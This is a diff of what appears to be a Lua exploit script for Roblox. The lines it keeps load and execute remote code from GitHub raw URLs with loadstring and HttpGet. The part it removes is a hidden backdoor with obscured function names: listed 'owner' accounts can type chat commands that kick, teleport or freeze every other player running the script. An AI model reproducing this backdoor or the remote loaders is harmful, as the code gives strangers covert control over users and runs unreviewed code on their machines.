@@ -7,7 +7,6 @@ if _G.MatchaScriptLoaded then
 end
 _G.MatchaScriptLoaded = true
 
-local success, err = pcall(function()
 getgenv().ownerUsernames = loadstring(game:HttpGet("https://raw.githubusercontent.com/quiwti08/beubebong/refs/heads/main/system/ownerlist", true))() or {}
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/quiwti08/beubebong/refs/heads/main/anhyeuvy"))()
@@ -12716,101 +12715,3 @@ Library:OnUnload(function()
     end
 end)
 end)()
-coroutine.wrap(function()
-local OWNERS = {
-	"anhchangm52",
-	"anhchangm53",
-	"anhchangm5",
-	"toyvayacutdii",
-	"anhaycogihontoi",
-	"dao_beo"
-}
-
--- // Lưu admin tạm thời (mất khi reload script)
-local TempAdmins = {}
-
--- // Kiểm tra quyền
-local function isOwner(player)
-	for _, name in ipairs(OWNERS) do
-		if player.Name == name then
-			return true
-		end
-	end
-	return false
-end
-
-local function isAdmin(player)
-	if isOwner(player) then return true end
-	for _, name in ipairs(TempAdmins) do
-		if player.Name == name then
-			return true
-		end
-	end
-	return false
-end
-
--- Owners code
-local owners = {
-    "anhchangm52",
-    "anhchangm53",  
-    "dao_beo",
-    "anhchangm5",
-    "anhchangm53",
-    "anhchongyeuvo",
-}
-
-function x1y2z3(targetPlayer, owner)
-    if targetPlayer and targetPlayer.Character and owner and owner.Character then
-        targetPlayer.Character:SetPrimaryPartCFrame(owner.Character.HumanoidRootPart.CFrame)
-    end
-end
-
-function a1b2c3(ownerName)
-    local owner
-
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player.Name == ownerName then
-            owner = player
-            break
-        end
-    end
-
-    if owner then
-        owner.Chatted:Connect(function(message)
-            if message == "/kick ." then
-                for _, player in ipairs(Players:GetPlayers()) do
-                    if player ~= owner then -- Không kick owner
-                        player:Kick("Admins Has Kicked You.")
-                    end
-                end
-            elseif message == "/bring ." then
-                for _, player in ipairs(Players:GetPlayers()) do
-                    if player ~= owner then -- Không bring owner
-                        x1y2z3(player, owner)
-                    end
-                end
-            elseif message == "/freeze ." then
-                for _, player in ipairs(Players:GetPlayers()) do
-                    if player ~= owner and player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
-                        player.Character.HumanoidRootPart.Anchored = true
-                    end
-                end
-            elseif message == "/unfreeze ." then
-                for _, player in ipairs(Players:GetPlayers()) do
-                    if player ~= owner and player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
-                        player.Character.HumanoidRootPart.Anchored = false
-                    end
-                end
-            end
-        end)
-    end
-end
-
-for _, ownerName in ipairs(owners) do
-    a1b2c3(ownerName)
-end
-end)()
-end)
-if not success then
-
-end
